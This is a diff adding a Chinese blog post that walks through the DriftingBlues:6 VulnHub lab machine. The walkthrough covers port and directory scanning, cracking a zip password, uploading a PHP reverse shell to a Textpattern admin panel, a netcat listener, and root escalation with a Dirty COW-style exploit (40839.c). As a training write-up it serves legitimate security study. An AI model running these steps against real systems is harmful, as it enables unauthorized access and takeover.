@@ -86,6 +86,109 @@
 
     
         <h2 class="title">
+            <a href="/2022/06/06/Driftingblues-6/">
+                Driftingblues 6
+            </a>
+        </h2>
+    
+    <time>
+        Jun 6, 2022
+    </time>
+    <section class="content">
+        <h1><span id="driftingblues6">Driftingblues:6</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称driftingblues6">名称：DriftingBlues:6</span></h4><h4><span id="发布日期2021330">发布日期：2021.3.30</span></h4><h4><span id="作者tasiyanci">作者：tasiyanci</span></h4><h4><span id="系列driftingblues">系列：DriftingBlues</span></h4><h4><span id="推特tasiyanci">推特：@tasiyanci</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>firefart:&#x2F;root&#x2F;flag.txt </p>
+<h4><span id="难度简单">难度：简单</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名driftingblues6_vhova">文件名：driftingblues6_vh.ova</span></h4><h4><span id="文件大小395mb">文件大小：395MB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagedriftingbluesdriftingblues6_vhova">下载地址：</span></h4><h4><span id="md5-1ef3ef660b6e129cca3d93f8fba0c94d">MD5: 1EF3EF660B6E129CCA3D93F8FBA0C94D</span></h4><h4><span id="sha1-01edac6d7ffad8b6487dd4dce021ccffd0250ce8">SHA1: 01EDAC6D7FFAD8B6487DD4DCE021CCFFD0250CE8</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机driftingblues6和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
+<p><img src="/2022/06/06/Driftingblues-6/1.png" alt="image-"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-6/2.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-6/3.png" alt="image-"></p>
+<p>2.再进行端口扫描，发现只开放了80端口，访问主页查看源码，没有过多线索：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.118 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-6/4.png" alt="image-"></p>
+<p><img src="/2022/06/06/Driftingblues-6/5.png" alt="image-"></p>
+<p>3.最后再进行一下目录扫描，发现有robots.txt文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.118/ -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-6/6.png" alt="image-"></p>
+</blockquote>
+<h3><span id="zip密码爆破">Zip密码爆破</span></h3><blockquote>
+<p>1.访问192.168.56.118&#x2F;robots.txt，得到&#x2F;textpattern&#x2F;textpattern目录存在的提示，同时提心我们关注.zip文件内容：</p>
+<p><img src="/2022/06/06/Driftingblues-6/7.png" alt="image-"></p>
+<p>2.继续访问192.168.56.118&#x2F;textpattern&#x2F;textpattern，发现是一个textpattern的管理后台登录页：</p>
+<p><img src="/2022/06/06/Driftingblues-6/8.png" alt="image-"></p>
+<p>3.根据提示，再次扫描目录，这次以.zip文件为主，找到spammer.zip：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.118/ -x zip --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录下.zip文件扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-6/9.png" alt="image-"></p>
+<p>4.利用fcrackzip对spammer.zip进行破解，可以得到zip内的一对用户名即密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -D -p rockyou.txt -u /home/kali/Downloads/spammer.zip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-6/10.png" alt="image-"></p>
+<p><img src="/2022/06/06/Driftingblues-6/11.png" alt="image-"></p>
+</blockquote>
+<h3><span id="文件上传webshell">文件上传webshell</span></h3><blockquote>
+<p>1.利用得到的用户和密码登录textpattern管理后台，发现在Content-File可以上传文件：</p>
+<p><img src="/2022/06/06/Driftingblues-6/12.png" alt="image-"></p>
+<p>2.我们可以上传kali自带的webshell，&#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php，修改ip及端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/share/webshells/php/php-reverse-shell.php</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-6/13.png" alt="image-"></p>
+<p><img src="/2022/06/06/Driftingblues-6/14.png" alt="image-"></p>
+<p>3.在kali开启对应的端口监听，然后访问192.168.56.118&#x2F;textpattern&#x2F;files&#x2F;php-reverse-shell.php触发：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9001</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spwan(&quot;/bin/bash&quot;);&#x27;，利用python建立交互式shell</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-6/15.png" alt="image-"></p>
+</blockquote>
+<h3><span id="linux内核漏洞提权">Linux内核漏洞提权</span></h3><blockquote>
+<p>1.获取shell后，我们可以查看靶机系统内核，发现版本为3.2.78:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-6/16.png" alt="image-"></p>
+<p>2.在kali上可以利用searchsploit搜索该版本漏洞，并且有对应的利用程序：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit linux 3.2.78</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-6/17.png" alt="image-"></p>
+<p>3.获取利用程序后，我们可以查看，发现程序可以修改靶机内核版本下linux用户的登录密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 40839.c</span><br><span class="line">cat 40839.c</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-6/18.png" alt="image-"></p>
+<p>4.再次通过textpattern后台上传40839.c，并在靶机&#x2F;var&#x2F;www&#x2F;textpattern&#x2F;files目录下对其编译，运行生成程序后修改密码：</p>
+<p><img src="/2022/06/06/Driftingblues-6/19.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/textpattern/files</span><br><span class="line">gcc -pthread 40839.c -o 40839 -lcrypt</span><br><span class="line">./40839</span><br><span class="line"></span><br><span class="line">123，修改后的password</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-6/20.png" alt="image-"></p>
+</blockquote>
+<h3><span id="flag获取">Flag获取</span></h3><blockquote>
+<p>1.现在我们可以利用修改后的密码登录firefart用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su firefart</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-6/21.png" alt="image-"></p>
+<p>2.在&#x2F;root目录下，能够找到flag，即flag.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/06/Driftingblues-6/22.png" alt="image-"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Driftingblues/" rel="tag">Driftingblues</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2022/06/06/Driftingblues-5/">
                 Driftingblues 5
             </a>
